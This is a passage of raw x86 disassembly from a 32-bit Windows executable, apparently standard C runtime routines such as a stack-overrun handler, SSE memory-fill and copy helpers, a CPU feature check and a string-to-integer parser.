  408877:	66 8c 1d 68 e6 40 00 	data16 mov %ds,0x40e668
  40887e:	66 8c 05 64 e6 40 00 	data16 mov %es,0x40e664
  408885:	66 8c 25 60 e6 40 00 	data16 mov %fs,0x40e660
  40888c:	66 8c 2d 5c e6 40 00 	data16 mov %gs,0x40e65c
  408893:	9c                   	pushf
  408894:	8f 05 90 e6 40 00    	pop    0x40e690
  40889a:	8b 45 00             	mov    0x0(%ebp),%eax
  40889d:	a3 84 e6 40 00       	mov    %eax,0x40e684
  4088a2:	8b 45 04             	mov    0x4(%ebp),%eax
  4088a5:	a3 88 e6 40 00       	mov    %eax,0x40e688
  4088aa:	8d 45 08             	lea    0x8(%ebp),%eax
  4088ad:	a3 94 e6 40 00       	mov    %eax,0x40e694
  4088b2:	8b 85 e0 fc ff ff    	mov    -0x320(%ebp),%eax
  4088b8:	c7 05 d0 e5 40 00 01 	movl   $0x10001,0x40e5d0
  4088bf:	00 01 00 
  4088c2:	a1 88 e6 40 00       	mov    0x40e688,%eax
  4088c7:	a3 84 e5 40 00       	mov    %eax,0x40e584
  4088cc:	c7 05 78 e5 40 00 09 	movl   $0xc0000409,0x40e578
  4088d3:	04 00 c0 
  4088d6:	c7 05 7c e5 40 00 01 	movl   $0x1,0x40e57c
  4088dd:	00 00 00 
  4088e0:	a1 60 db 40 00       	mov    0x40db60,%eax
  4088e5:	89 85 d8 fc ff ff    	mov    %eax,-0x328(%ebp)
  4088eb:	a1 64 db 40 00       	mov    0x40db64,%eax
  4088f0:	89 85 dc fc ff ff    	mov    %eax,-0x324(%ebp)
  4088f6:	ff 15 64 a0 40 00    	call   *0x40a064
  4088fc:	a3 c8 e5 40 00       	mov    %eax,0x40e5c8
  408901:	6a 01                	push   $0x1
  408903:	e8 8d c3 ff ff       	call   0x404c95
  408908:	59                   	pop    %ecx
  408909:	6a 00                	push   $0x0
  40890b:	ff 15 60 a0 40 00    	call   *0x40a060
  408911:	68 64 b3 40 00       	push   $0x40b364
  408916:	ff 15 5c a0 40 00    	call   *0x40a05c
  40891c:	83 3d c8 e5 40 00 00 	cmpl   $0x0,0x40e5c8
  408923:	75 08                	jne    0x40892d
  408925:	6a 01                	push   $0x1
  408927:	e8 69 c3 ff ff       	call   0x404c95
  40892c:	59                   	pop    %ecx
  40892d:	68 09 04 00 c0       	push   $0xc0000409
  408932:	ff 15 58 a0 40 00    	call   *0x40a058
  408938:	50                   	push   %eax
  408939:	ff 15 54 a0 40 00    	call   *0x40a054
  40893f:	c9                   	leave
  408940:	c3                   	ret
  408941:	55                   	push   %ebp
  408942:	8b ec                	mov    %esp,%ebp
  408944:	83 ec 04             	sub    $0x4,%esp
  408947:	89 7d fc             	mov    %edi,-0x4(%ebp)
  40894a:	8b 7d 08             	mov    0x8(%ebp),%edi
  40894d:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  408950:	c1 e9 07             	shr    $0x7,%ecx
  408953:	66 0f ef c0          	pxor   %xmm0,%xmm0
  408957:	eb 08                	jmp    0x408961
  408959:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  408960:	90                   	nop
  408961:	66 0f 7f 07          	movdqa %xmm0,(%edi)
  408965:	66 0f 7f 47 10       	movdqa %xmm0,0x10(%edi)
  40896a:	66 0f 7f 47 20       	movdqa %xmm0,0x20(%edi)
  40896f:	66 0f 7f 47 30       	movdqa %xmm0,0x30(%edi)
  408974:	66 0f 7f 47 40       	movdqa %xmm0,0x40(%edi)
  408979:	66 0f 7f 47 50       	movdqa %xmm0,0x50(%edi)
  40897e:	66 0f 7f 47 60       	movdqa %xmm0,0x60(%edi)
  408983:	66 0f 7f 47 70       	movdqa %xmm0,0x70(%edi)
  408988:	8d bf 80 00 00 00    	lea    0x80(%edi),%edi
  40898e:	49                   	dec    %ecx
  40898f:	75 d0                	jne    0x408961
  408991:	8b 7d fc             	mov    -0x4(%ebp),%edi
  408994:	8b e5                	mov    %ebp,%esp
  408996:	5d                   	pop    %ebp
  408997:	c3                   	ret
  408998:	55                   	push   %ebp
  408999:	8b ec                	mov    %esp,%ebp
  40899b:	83 ec 10             	sub    $0x10,%esp
  40899e:	89 7d fc             	mov    %edi,-0x4(%ebp)
  4089a1:	8b 45 08             	mov    0x8(%ebp),%eax
  4089a4:	99                   	cltd
  4089a5:	8b f8                	mov    %eax,%edi
  4089a7:	33 fa                	xor    %edx,%edi
  4089a9:	2b fa                	sub    %edx,%edi
  4089ab:	83 e7 0f             	and    $0xf,%edi
  4089ae:	33 fa                	xor    %edx,%edi
  4089b0:	2b fa                	sub    %edx,%edi
  4089b2:	85 ff                	test   %edi,%edi
  4089b4:	75 3c                	jne    0x4089f2
  4089b6:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4089b9:	8b d1                	mov    %ecx,%edx
  4089bb:	83 e2 7f             	and    $0x7f,%edx
  4089be:	89 55 f4             	mov    %edx,-0xc(%ebp)
  4089c1:	3b ca                	cmp    %edx,%ecx
  4089c3:	74 12                	je     0x4089d7
  4089c5:	2b ca                	sub    %edx,%ecx
  4089c7:	51                   	push   %ecx
  4089c8:	50                   	push   %eax
  4089c9:	e8 73 ff ff ff       	call   0x408941
  4089ce:	83 c4 08             	add    $0x8,%esp
  4089d1:	8b 45 08             	mov    0x8(%ebp),%eax
  4089d4:	8b 55 f4             	mov    -0xc(%ebp),%edx
  4089d7:	85 d2                	test   %edx,%edx
  4089d9:	74 45                	je     0x408a20
  4089db:	03 45 10             	add    0x10(%ebp),%eax
  4089de:	2b c2                	sub    %edx,%eax
  4089e0:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4089e3:	33 c0                	xor    %eax,%eax
  4089e5:	8b 7d f8             	mov    -0x8(%ebp),%edi
  4089e8:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4089eb:	f3 aa                	rep stos %al,%es:(%edi)
  4089ed:	8b 45 08             	mov    0x8(%ebp),%eax
  4089f0:	eb 2e                	jmp    0x408a20
  4089f2:	f7 df                	neg    %edi
  4089f4:	83 c7 10             	add    $0x10,%edi
  4089f7:	89 7d f0             	mov    %edi,-0x10(%ebp)
  4089fa:	33 c0                	xor    %eax,%eax
  4089fc:	8b 7d 08             	mov    0x8(%ebp),%edi
  4089ff:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  408a02:	f3 aa                	rep stos %al,%es:(%edi)
  408a04:	8b 45 f0             	mov    -0x10(%ebp),%eax
  408a07:	8b 4d 08             	mov    0x8(%ebp),%ecx
  408a0a:	8b 55 10             	mov    0x10(%ebp),%edx
  408a0d:	03 c8                	add    %eax,%ecx
  408a0f:	2b d0                	sub    %eax,%edx
  408a11:	52                   	push   %edx
  408a12:	6a 00                	push   $0x0
  408a14:	51                   	push   %ecx
  408a15:	e8 7e ff ff ff       	call   0x408998
  408a1a:	83 c4 0c             	add    $0xc,%esp
  408a1d:	8b 45 08             	mov    0x8(%ebp),%eax
  408a20:	8b 7d fc             	mov    -0x4(%ebp),%edi
  408a23:	8b e5                	mov    %ebp,%esp
  408a25:	5d                   	pop    %ebp
  408a26:	c3                   	ret
  408a27:	6a 0c                	push   $0xc
  408a29:	68 70 b8 40 00       	push   $0x40b870
  408a2e:	e8 ed a4 ff ff       	call   0x402f20
  408a33:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  408a37:	66 0f 28 c1          	movapd %xmm1,%xmm0
  408a3b:	c7 45 e4 01 00 00 00 	movl   $0x1,-0x1c(%ebp)
  408a42:	eb 23                	jmp    0x408a67
  408a44:	8b 45 ec             	mov    -0x14(%ebp),%eax
  408a47:	8b 00                	mov    (%eax),%eax
  408a49:	8b 00                	mov    (%eax),%eax
  408a4b:	3d 05 00 00 c0       	cmp    $0xc0000005,%eax
  408a50:	74 0a                	je     0x408a5c
  408a52:	3d 1d 00 00 c0       	cmp    $0xc000001d,%eax
  408a57:	74 03                	je     0x408a5c
  408a59:	33 c0                	xor    %eax,%eax
  408a5b:	c3                   	ret
  408a5c:	33 c0                	xor    %eax,%eax
  408a5e:	40                   	inc    %eax
  408a5f:	c3                   	ret
  408a60:	8b 65 e8             	mov    -0x18(%ebp),%esp
  408a63:	83 65 e4 00          	andl   $0x0,-0x1c(%ebp)
  408a67:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  408a6e:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  408a71:	e8 ef a4 ff ff       	call   0x402f65
  408a76:	c3                   	ret
  408a77:	8b ff                	mov    %edi,%edi
  408a79:	55                   	push   %ebp
  408a7a:	8b ec                	mov    %esp,%ebp
  408a7c:	83 ec 18             	sub    $0x18,%esp
  408a7f:	33 c0                	xor    %eax,%eax
  408a81:	53                   	push   %ebx
  408a82:	89 45 fc             	mov    %eax,-0x4(%ebp)
  408a85:	89 45 f4             	mov    %eax,-0xc(%ebp)
  408a88:	89 45 f8             	mov    %eax,-0x8(%ebp)
  408a8b:	53                   	push   %ebx
  408a8c:	9c                   	pushf
  408a8d:	58                   	pop    %eax
  408a8e:	8b c8                	mov    %eax,%ecx
  408a90:	35 00 00 20 00       	xor    $0x200000,%eax
  408a95:	50                   	push   %eax
  408a96:	9d                   	popf
  408a97:	9c                   	pushf
  408a98:	5a                   	pop    %edx
  408a99:	2b d1                	sub    %ecx,%edx
  408a9b:	74 1f                	je     0x408abc
  408a9d:	51                   	push   %ecx
  408a9e:	9d                   	popf
  408a9f:	33 c0                	xor    %eax,%eax
  408aa1:	0f a2                	cpuid
  408aa3:	89 45 f4             	mov    %eax,-0xc(%ebp)
  408aa6:	89 5d e8             	mov    %ebx,-0x18(%ebp)
  408aa9:	89 55 ec             	mov    %edx,-0x14(%ebp)
  408aac:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  408aaf:	b8 01 00 00 00       	mov    $0x1,%eax
  408ab4:	0f a2                	cpuid
  408ab6:	89 55 fc             	mov    %edx,-0x4(%ebp)
  408ab9:	89 45 f8             	mov    %eax,-0x8(%ebp)
  408abc:	5b                   	pop    %ebx
  408abd:	f7 45 fc 00 00 00 04 	testl  $0x4000000,-0x4(%ebp)
  408ac4:	74 0e                	je     0x408ad4
  408ac6:	e8 5c ff ff ff       	call   0x408a27
  408acb:	85 c0                	test   %eax,%eax
  408acd:	74 05                	je     0x408ad4
  408acf:	33 c0                	xor    %eax,%eax
  408ad1:	40                   	inc    %eax
  408ad2:	eb 02                	jmp    0x408ad6
  408ad4:	33 c0                	xor    %eax,%eax
  408ad6:	5b                   	pop    %ebx
  408ad7:	c9                   	leave
  408ad8:	c3                   	ret
  408ad9:	e8 99 ff ff ff       	call   0x408a77
  408ade:	a3 60 e9 40 00       	mov    %eax,0x40e960
  408ae3:	33 c0                	xor    %eax,%eax
  408ae5:	c3                   	ret
  408ae6:	8b ff                	mov    %edi,%edi
  408ae8:	55                   	push   %ebp
  408ae9:	8b ec                	mov    %esp,%ebp
  408aeb:	83 ec 14             	sub    $0x14,%esp
  408aee:	56                   	push   %esi
  408aef:	57                   	push   %edi
  408af0:	ff 75 08             	push   0x8(%ebp)
  408af3:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  408af6:	e8 5e 8c ff ff       	call   0x401759
  408afb:	8b 45 10             	mov    0x10(%ebp),%eax
  408afe:	8b 75 0c             	mov    0xc(%ebp),%esi
  408b01:	33 ff                	xor    %edi,%edi
  408b03:	3b c7                	cmp    %edi,%eax
  408b05:	74 02                	je     0x408b09
  408b07:	89 30                	mov    %esi,(%eax)
  408b09:	3b f7                	cmp    %edi,%esi
  408b0b:	75 2c                	jne    0x408b39
  408b0d:	e8 6d 8e ff ff       	call   0x40197f
  408b12:	57                   	push   %edi
  408b13:	57                   	push   %edi
  408b14:	57                   	push   %edi
  408b15:	57                   	push   %edi
  408b16:	57                   	push   %edi
  408b17:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  408b1d:	e8 f5 8d ff ff       	call   0x401917
  408b22:	83 c4 14             	add    $0x14,%esp
  408b25:	80 7d f8 00          	cmpb   $0x0,-0x8(%ebp)
  408b29:	74 07                	je     0x408b32
  408b2b:	8b 45 f4             	mov    -0xc(%ebp),%eax
  408b2e:	83 60 70 fd          	andl   $0xfffffffd,0x70(%eax)
  408b32:	33 c0                	xor    %eax,%eax
  408b34:	e9 d8 01 00 00       	jmp    0x408d11
  408b39:	39 7d 14             	cmp    %edi,0x14(%ebp)
  408b3c:	74 0c                	je     0x408b4a
  408b3e:	83 7d 14 02          	cmpl   $0x2,0x14(%ebp)
  408b42:	7c c9                	jl     0x408b0d
  408b44:	83 7d 14 24          	cmpl   $0x24,0x14(%ebp)
  408b48:	7f c3                	jg     0x408b0d
  408b4a:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  408b4d:	53                   	push   %ebx
  408b4e:	8a 1e                	mov    (%esi),%bl
  408b50:	89 7d fc             	mov    %edi,-0x4(%ebp)
  408b53:	8d 7e 01             	lea    0x1(%esi),%edi
  408b56:	83 b9 ac 00 00 00 01 	cmpl   $0x1,0xac(%ecx)
  408b5d:	7e 17                	jle    0x408b76
  408b5f:	8d 45 ec             	lea    -0x14(%ebp),%eax
  408b62:	50                   	push   %eax
  408b63:	0f b6 c3             	movzbl %bl,%eax
  408b66:	6a 08                	push   $0x8
  408b68:	50                   	push   %eax
  408b69:	e8 04 0e 00 00       	call   0x409972
  408b6e:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  408b71:	83 c4 0c             	add    $0xc,%esp
  408b74:	eb 10                	jmp    0x408b86
  408b76:	8b 91 c8 00 00 00    	mov    0xc8(%ecx),%edx
  408b7c:	0f b6 c3             	movzbl %bl,%eax
  408b7f:	0f b7 04 42          	movzwl (%edx,%eax,2),%eax
  408b83:	83 e0 08             	and    $0x8,%eax
  408b86:	85 c0                	test   %eax,%eax
  408b88:	74 05                	je     0x408b8f
  408b8a:	8a 1f                	mov    (%edi),%bl
  408b8c:	47                   	inc    %edi
  408b8d:	eb c7                	jmp    0x408b56
  408b8f:	80 fb 2d             	cmp    $0x2d,%bl
  408b92:	75 06                	jne    0x408b9a
  408b94:	83 4d 18 02          	orl    $0x2,0x18(%ebp)
  408b98:	eb 05                	jmp    0x408b9f
  408b9a:	80 fb 2b             	cmp    $0x2b,%bl
  408b9d:	75 03                	jne    0x408ba2
  408b9f:	8a 1f                	mov    (%edi),%bl
  408ba1:	47                   	inc    %edi
  408ba2:	8b 45 14             	mov    0x14(%ebp),%eax
  408ba5:	85 c0                	test   %eax,%eax
  408ba7:	0f 8c 4b 01 00 00    	jl     0x408cf8
  408bad:	83 f8 01             	cmp    $0x1,%eax
  408bb0:	0f 84 42 01 00 00    	je     0x408cf8
  408bb6:	83 f8 24             	cmp    $0x24,%eax
  408bb9:	0f 8f 39 01 00 00    	jg     0x408cf8
  408bbf:	85 c0                	test   %eax,%eax
  408bc1:	75 2a                	jne    0x408bed
  408bc3:	80 fb 30             	cmp    $0x30,%bl
  408bc6:	74 09                	je     0x408bd1
  408bc8:	c7 45 14 0a 00 00 00 	movl   $0xa,0x14(%ebp)
  408bcf:	eb 34                	jmp    0x408c05
  408bd1:	8a 07                	mov    (%edi),%al
  408bd3:	3c 78                	cmp    $0x78,%al
  408bd5:	74 0d                	je     0x408be4
  408bd7:	3c 58                	cmp    $0x58,%al
  408bd9:	74 09                	je     0x408be4
  408bdb:	c7 45 14 08 00 00 00 	movl   $0x8,0x14(%ebp)
  408be2:	eb 21                	jmp    0x408c05
  408be4:	c7 45 14 10 00 00 00 	movl   $0x10,0x14(%ebp)
  408beb:	eb 0a                	jmp    0x408bf7
  408bed:	83 f8 10             	cmp    $0x10,%eax
  408bf0:	75 13                	jne    0x408c05
  408bf2:	80 fb 30             	cmp    $0x30,%bl
  408bf5:	75 0e                	jne    0x408c05
  408bf7:	8a 07                	mov    (%edi),%al
  408bf9:	3c 78                	cmp    $0x78,%al
  408bfb:	74 04                	je     0x408c01
  408bfd:	3c 58                	cmp    $0x58,%al
  408bff:	75 04                	jne    0x408c05
  408c01:	47                   	inc    %edi
  408c02:	8a 1f                	mov    (%edi),%bl
  408c04:	47                   	inc    %edi
  408c05:	8b b1 c8 00 00 00    	mov    0xc8(%ecx),%esi
  408c0b:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  408c10:	33 d2                	xor    %edx,%edx
  408c12:	f7 75 14             	divl   0x14(%ebp)
  408c15:	0f b6 cb             	movzbl %bl,%ecx
  408c18:	0f b7 0c 4e          	movzwl (%esi,%ecx,2),%ecx
  408c1c:	f6 c1 04             	test   $0x4,%cl
  408c1f:	74 08                	je     0x408c29
  408c21:	0f be cb             	movsbl %bl,%ecx
  408c24:	83 e9 30             	sub    $0x30,%ecx
  408c27:	eb 1b                	jmp    0x408c44
  408c29:	f7 c1 03 01 00 00    	test   $0x103,%ecx
  408c2f:	74 31                	je     0x408c62
  408c31:	8a cb                	mov    %bl,%cl
  408c33:	80 e9 61             	sub    $0x61,%cl
  408c36:	80 f9 19             	cmp    $0x19,%cl
  408c39:	0f be cb             	movsbl %bl,%ecx
  408c3c:	77 03                	ja     0x408c41
  408c3e:	83 e9 20             	sub    $0x20,%ecx
  408c41:	83 c1 c9             	add    $0xffffffc9,%ecx
  408c44:	3b 4d 14             	cmp    0x14(%ebp),%ecx
  408c47:	73 19                	jae    0x408c62
  408c49:	83 4d 18 08          	orl    $0x8,0x18(%ebp)
  408c4d:	39 45 fc             	cmp    %eax,-0x4(%ebp)
  408c50:	72 27                	jb     0x408c79
  408c52:	75 04                	jne    0x408c58
  408c54:	3b ca                	cmp    %edx,%ecx
  408c56:	76 21                	jbe    0x408c79
  408c58:	83 4d 18 04          	orl    $0x4,0x18(%ebp)
  408c5c:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  408c60:	75 23                	jne    0x408c85
  408c62:	8b 45 18             	mov    0x18(%ebp),%eax
  408c65:	4f                   	dec    %edi
  408c66:	a8 08                	test   $0x8,%al
  408c68:	75 20                	jne    0x408c8a
  408c6a:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  408c6e:	74 03                	je     0x408c73
  408c70:	8b 7d 0c             	mov    0xc(%ebp),%edi
  408c73:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  408c77:	eb 5b                	jmp    0x408cd4
  408c79:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  408c7c:	0f af 5d 14          	imul   0x14(%ebp),%ebx
  408c80:	03 d9                	add    %ecx,%ebx
  408c82:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  408c85:	8a 1f                	mov    (%edi),%bl
  408c87:	47                   	inc    %edi
  408c88:	eb 8b                	jmp    0x408c15
  408c8a:	be ff ff ff 7f       	mov    $0x7fffffff,%esi
  408c8f:	a8 04                	test   $0x4,%al
  408c91:	75 1b                	jne    0x408cae
  408c93:	a8 01                	test   $0x1,%al
  408c95:	75 3d                	jne    0x408cd4
  408c97:	83 e0 02             	and    $0x2,%eax
  408c9a:	74 09                	je     0x408ca5
  408c9c:	81 7d fc 00 00 00 80 	cmpl   $0x80000000,-0x4(%ebp)
  408ca3:	77 09                	ja     0x408cae
  408ca5:	85 c0                	test   %eax,%eax
  408ca7:	75 2b                	jne    0x408cd4
  408ca9:	39 75 fc             	cmp    %esi,-0x4(%ebp)
  408cac:	76 26                	jbe    0x408cd4
  408cae:	e8 cc 8c ff ff       	call   0x40197f
  408cb3:	f6 45 18 01          	testb  $0x1,0x18(%ebp)
  408cb7:	c7 00 22 00 00 00    	movl   $0x22,(%eax)
  408cbd:	74 06                	je     0x408cc5
  408cbf:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  408cc3:	eb 0f                	jmp    0x408cd4
  408cc5:	f6 45 18 02          	testb  $0x2,0x18(%ebp)
  408cc9:	6a 00                	push   $0x0
  408ccb:	58                   	pop    %eax
  408ccc:	0f 95 c0             	setne  %al
  408ccf:	03 c6                	add    %esi,%eax
  408cd1:	89 45 fc             	mov    %eax,-0x4(%ebp)
  408cd4:	8b 45 10             	mov    0x10(%ebp),%eax
  408cd7:	85 c0                	test   %eax,%eax
  408cd9:	74 02                	je     0x408cdd
  408cdb:	89 38                	mov    %edi,(%eax)
  408cdd:	f6 45 18 02          	testb  $0x2,0x18(%ebp)
  408ce1:	74 03                	je     0x408ce6
  408ce3:	f7 5d fc             	negl   -0x4(%ebp)
  408ce6:	80 7d f8 00          	cmpb   $0x0,-0x8(%ebp)
  408cea:	74 07                	je     0x408cf3
  408cec:	8b 45 f4             	mov    -0xc(%ebp),%eax
  408cef:	83 60 70 fd          	andl   $0xfffffffd,0x70(%eax)
  408cf3:	8b 45 fc             	mov    -0x4(%ebp),%eax
  408cf6:	eb 18                	jmp    0x408d10
  408cf8:	8b 45 10             	mov    0x10(%ebp),%eax
  408cfb:	85 c0                	test   %eax,%eax
  408cfd:	74 02                	je     0x408d01
  408cff:	89 30                	mov    %esi,(%eax)
  408d01:	80 7d f8 00          	cmpb   $0x0,-0x8(%ebp)
  408d05:	74 07                	je     0x408d0e
  408d07:	8b 45 f4             	mov    -0xc(%ebp),%eax
  408d0a:	83 60 70 fd          	andl   $0xfffffffd,0x70(%eax)
  408d0e:	33 c0                	xor    %eax,%eax
  408d10:	5b                   	pop    %ebx
  408d11:	5f                   	pop    %edi
  408d12:	5e                   	pop    %esi
  408d13:	c9                   	leave
  408d14:	c3                   	ret
  408d15:	8b ff                	mov    %edi,%edi
  408d17:	55                   	push   %ebp
  408d18:	8b ec                	mov    %esp,%ebp
  408d1a:	33 c0                	xor    %eax,%eax
  408d1c:	50                   	push   %eax
  408d1d:	ff 75 10             	push   0x10(%ebp)
  408d20:	ff 75 0c             	push   0xc(%ebp)
  408d23:	ff 75 08             	push   0x8(%ebp)
  408d26:	39 05 a0 e3 40 00    	cmp    %eax,0x40e3a0
  408d2c:	75 07                	jne    0x408d35
  408d2e:	68 30 db 40 00       	push   $0x40db30
  408d33:	eb 01                	jmp    0x408d36
  408d35:	50                   	push   %eax
  408d36:	e8 ab fd ff ff       	call   0x408ae6
  408d3b:	83 c4 14             	add    $0x14,%esp
  408d3e:	5d                   	pop    %ebp
  408d3f:	c3                   	ret
  408d40:	8b ff                	mov    %edi,%edi
  408d42:	55                   	push   %ebp
  408d43:	8b ec                	mov    %esp,%ebp
  408d45:	81 ec 28 03 00 00    	sub    $0x328,%esp
  408d4b:	a1 60 db 40 00       	mov    0x40db60,%eax
  408d50:	33 c5                	xor    %ebp,%eax
  408d52:	89 45 fc             	mov    %eax,-0x4(%ebp)
  408d55:	f6 05 b0 dd 40 00 01 	testb  $0x1,0x40ddb0
  408d5c:	56                   	push   %esi
  408d5d:	74 08                	je     0x408d67
  408d5f:	6a 0a                	push   $0xa
  408d61:	e8 3e 91 ff ff       	call   0x401ea4
  408d66:	59                   	pop    %ecx
  408d67:	e8 06 d1 ff ff       	call   0x405e72
  408d6c:	85 c0                	test   %eax,%eax
  408d6e:	74 08                	je     0x408d78
  408d70:	6a 16                	push   $0x16
  408d72:	e8 08 d1 ff ff       	call   0x405e7f
  408d77:	59                   	pop    %ecx
  408d78:	f6 05 b0 dd 40 00 02 	testb  $0x2,0x40ddb0
  408d7f:	0f 84 ca 00 00 00    	je     0x408e4f
  408d85:	89 85 e0 fd ff ff    	mov    %eax,-0x220(%ebp)
  408d8b:	89 8d dc fd ff ff    	mov    %ecx,-0x224(%ebp)
  408d91:	89 95 d8 fd ff ff    	mov    %edx,-0x228(%ebp)
  408d97:	89 9d d4 fd ff ff    	mov    %ebx,-0x22c(%ebp)
  408d9d:	89 b5 d0 fd ff ff    	mov    %esi,-0x230(%ebp)
  408da3:	89 bd cc fd ff ff    	mov    %edi,-0x234(%ebp)
  408da9:	66 8c 95 f8 fd ff ff 	data16 mov %ss,-0x208(%ebp)
  408db0:	66 8c 8d ec fd ff ff 	data16 mov %cs,-0x214(%ebp)
  408db7:	66 8c 9d c8 fd ff ff 	data16 mov %ds,-0x238(%ebp)
  408dbe:	66 8c 85 c4 fd ff ff 	data16 mov %es,-0x23c(%ebp)
  408dc5:	66 8c a5 c0 fd ff ff 	data16 mov %fs,-0x240(%ebp)
  408dcc:	66 8c ad bc fd ff ff 	data16 mov %gs,-0x244(%ebp)
  408dd3:	9c                   	pushf
  408dd4:	8f 85 f0 fd ff ff    	pop    -0x210(%ebp)
  408dda:	8b 75 04             	mov    0x4(%ebp),%esi
  408ddd:	8d 45 04             	lea    0x4(%ebp),%eax
  408de0:	89 85 f4 fd ff ff    	mov    %eax,-0x20c(%ebp)
  408de6:	c7 85 30 fd ff ff 01 	movl   $0x10001,-0x2d0(%ebp)
  408ded:	00 01 00 
  408df0:	89 b5 e8 fd ff ff    	mov    %esi,-0x218(%ebp)
  408df6:	8b 40 fc             	mov    -0x4(%eax),%eax
  408df9:	6a 50                	push   $0x50
  408dfb:	89 85 e4 fd ff ff    	mov    %eax,-0x21c(%ebp)
  408e01:	8d 85 d8 fc ff ff    	lea    -0x328(%ebp),%eax
  408e07:	6a 00                	push   $0x0
  408e09:	50                   	push   %eax
  408e0a:	e8 91 be ff ff       	call   0x404ca0
  408e0f:	8d 85 d8 fc ff ff    	lea    -0x328(%ebp),%eax
  408e15:	83 c4 0c             	add    $0xc,%esp
  408e18:	89 85 28 fd ff ff    	mov    %eax,-0x2d8(%ebp)
  408e1e:	8d 85 30 fd ff ff    	lea    -0x2d0(%ebp),%eax
  408e24:	6a 00                	push   $0x0
  408e26:	c7 85 d8 fc ff ff 15 	movl   $0x40000015,-0x328(%ebp)
  408e2d:	00 00 40 
  408e30:	89 b5 e4 fc ff ff    	mov    %esi,-0x31c(%ebp)
  408e36:	89 85 2c fd ff ff    	mov    %eax,-0x2d4(%ebp)
  408e3c:	ff 15 60 a0 40 00    	call   *0x40a060
  408e42:	8d 85 28 fd ff ff    	lea    -0x2d8(%ebp),%eax
  408e48:	50                   	push   %eax
  408e49:	ff 15 5c a0 40 00    	call   *0x40a05c
  408e4f:	6a 03                	push   $0x3
  408e51:	e8 cc 8f ff ff       	call   0x401e22
  408e56:	cc                   	int3
  408e57:	6a 10                	push   $0x10
  408e59:	68 90 b8 40 00       	push   $0x40b890
  408e5e:	e8 bd a0 ff ff       	call   0x402f20
  408e63:	33 c0                	xor    %eax,%eax
  408e65:	8b 5d 08             	mov    0x8(%ebp),%ebx
  408e68:	33 ff                	xor    %edi,%edi
  408e6a:	3b df                	cmp    %edi,%ebx
  408e6c:	0f 95 c0             	setne  %al
  408e6f:	3b c7                	cmp    %edi,%eax
  408e71:	75 1d                	jne    0x408e90
  408e73:	e8 07 8b ff ff       	call   0x40197f
  408e78:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  408e7e:	57                   	push   %edi
  408e7f:	57                   	push   %edi
  408e80:	57                   	push   %edi
  408e81:	57                   	push   %edi
  408e82:	57                   	push   %edi
  408e83:	e8 8f 8a ff ff       	call   0x401917
  408e88:	83 c4 14             	add    $0x14,%esp
  408e8b:	83 c8 ff             	or     $0xffffffff,%eax
  408e8e:	eb 53                	jmp    0x408ee3
  408e90:	83 3d a8 f9 40 00 03 	cmpl   $0x3,0x40f9a8
  408e97:	75 38                	jne    0x408ed1
  408e99:	6a 04                	push   $0x4
  408e9b:	e8 b6 cc ff ff       	call   0x405b56
  408ea0:	59                   	pop    %ecx
  408ea1:	89 7d fc             	mov    %edi,-0x4(%ebp)
  408ea4:	53                   	push   %ebx
  408ea5:	e8 6b d9 ff ff       	call   0x406815
  408eaa:	59                   	pop    %ecx
  408eab:	89 45 e0             	mov    %eax,-0x20(%ebp)
  408eae:	3b c7                	cmp    %edi,%eax
  408eb0:	74 0b                	je     0x408ebd
  408eb2:	8b 73 fc             	mov    -0x4(%ebx),%esi
  408eb5:	83 ee 09             	sub    $0x9,%esi
  408eb8:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  408ebb:	eb 03                	jmp    0x408ec0
  408ebd:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  408ec0:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  408ec7:	e8 25 00 00 00       	call   0x408ef1
  408ecc:	39 7d e0             	cmp    %edi,-0x20(%ebp)
  408ecf:	75 10                	jne    0x408ee1
  408ed1:	53                   	push   %ebx
  408ed2:	57                   	push   %edi
  408ed3:	ff 35 7c e3 40 00    	push   0x40e37c
  408ed9:	ff 15 3c a1 40 00    	call   *0x40a13c
  408edf:	8b f0                	mov    %eax,%esi
  408ee1:	8b c6                	mov    %esi,%eax
  408ee3:	e8 7d a0 ff ff       	call   0x402f65
  408ee8:	c3                   	ret
  408ee9:	33 ff                	xor    %edi,%edi
  408eeb:	8b 5d 08             	mov    0x8(%ebp),%ebx
  408eee:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  408ef1:	6a 04                	push   $0x4
  408ef3:	e8 84 cb ff ff       	call   0x405a7c
  408ef8:	59                   	pop    %ecx
  408ef9:	c3                   	ret
  408efa:	55                   	push   %ebp
  408efb:	8b ec                	mov    %esp,%ebp
  408efd:	83 ec 08             	sub    $0x8,%esp
  408f00:	89 7d fc             	mov    %edi,-0x4(%ebp)
  408f03:	89 75 f8             	mov    %esi,-0x8(%ebp)
  408f06:	8b 75 0c             	mov    0xc(%ebp),%esi
  408f09:	8b 7d 08             	mov    0x8(%ebp),%edi
  408f0c:	8b 4d 10             	mov    0x10(%ebp),%ecx
  408f0f:	c1 e9 07             	shr    $0x7,%ecx
  408f12:	eb 06                	jmp    0x408f1a
  408f14:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  408f1a:	66 0f 6f 06          	movdqa (%esi),%xmm0
  408f1e:	66 0f 6f 4e 10       	movdqa 0x10(%esi),%xmm1
  408f23:	66 0f 6f 56 20       	movdqa 0x20(%esi),%xmm2
